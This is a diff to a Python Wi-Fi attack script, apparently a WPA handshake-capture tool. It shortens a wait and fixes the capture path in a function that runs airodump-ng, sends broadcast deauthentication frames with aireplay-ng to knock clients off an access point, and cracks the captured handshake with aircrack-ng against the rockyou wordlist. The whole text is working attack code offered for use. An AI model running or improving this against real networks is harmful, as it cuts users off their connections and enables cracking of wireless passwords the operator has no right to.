@@ -143,7 +143,7 @@ def attack_func(network_interface, attack_mode):
         get_current_path = subprocess.check_output('pwd').strip()
         set_path = f'{get_current_path.decode()}/Capture'
         os.system(f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
-        time.sleep(10)
+        time.sleep(5)
         os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
@@ -152,7 +152,7 @@ def attack_func(network_interface, attack_mode):
             if b'xterm' in line:
                 pid = int(line.split(None, 1)[0])
                 os.kill(pid, signal.SIGKILL)
-        os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
+        os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}.cap &")
         os.system('clear')
         quit_program()
     # PKMID Attack Mode
